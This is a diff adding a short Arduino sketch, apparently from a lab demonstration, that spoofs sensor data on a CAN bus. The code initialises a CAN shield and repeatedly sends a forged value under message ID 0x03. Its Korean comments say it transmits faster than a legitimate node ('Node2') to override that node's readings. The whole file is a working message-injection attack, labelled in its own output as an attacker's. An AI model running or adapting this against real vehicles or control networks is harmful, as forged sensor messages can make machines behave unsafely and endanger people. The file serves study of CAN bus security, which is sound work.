@@ -1,0 +1,35 @@
+// send fake sensor data
+
+#include <df_can.h>
+#include <SPI.h>
+
+const int SPI_CS_PIN = 10;
+MCPCAN CAN(SPI_CS_PIN);
+
+void setup()
+{
+  Serial.begin(9600);
+  int count = 50;
+  do {
+    CAN.init();
+    if (CAN_OK == CAN.begin(CAN_500KBPS)) {
+      Serial.println("CAN BUS Shied init ok!");
+      break;
+    } else {
+      delay(100);
+      if (count == 0)
+        Serial.println("CAN BUS Shield init failed");
+    }
+  } while(count--);
+}
+
+void loop()
+{
+  unsigned char fakeData[1] = { 100 };
+
+  // ID 0x03으로 조작된 데이터 전송
+  CAN.sendMsgBuf(0x03, 0, 1, fakeData);
+  Serial.println("Attacker sent spoofed data: 100");
+
+  delay(500); // Node2보다 짧은 간격으로 전송
+}
